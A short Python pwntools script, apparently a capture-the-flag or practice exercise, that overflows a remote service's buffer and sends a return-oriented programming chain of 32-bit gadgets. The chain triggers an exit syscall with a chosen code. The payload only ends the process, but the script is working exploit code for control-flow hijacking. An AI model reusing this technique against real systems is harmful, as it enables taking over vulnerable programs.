#!/usr/bin/env python3
#coding: utf-8

from pwn import *
from struct import pack
from constants import *
    

def exit_custom_nb(nb):
    g = cyclic_gen()
    conn = remote(HOST,PORT)
    p = b''.join([
        b'A'*OFFSET,
        pack('<I', 0x0804ff10), # xor eax, eax ; ret
        pack('<I', 0x08088b3a), # inc eax ; ret
        pack('<I', 0x0804901e), # pop ebx ; ret
        pack('<I', nb),
        pack('<I', 0x0804ac72) # int 0x80
    ]) 
    conn.send(p)
    conn.close()



def main():
    exitcode = 10
    exit_custom_nb(exitcode)
    
if __name__ == '__main__':
    main()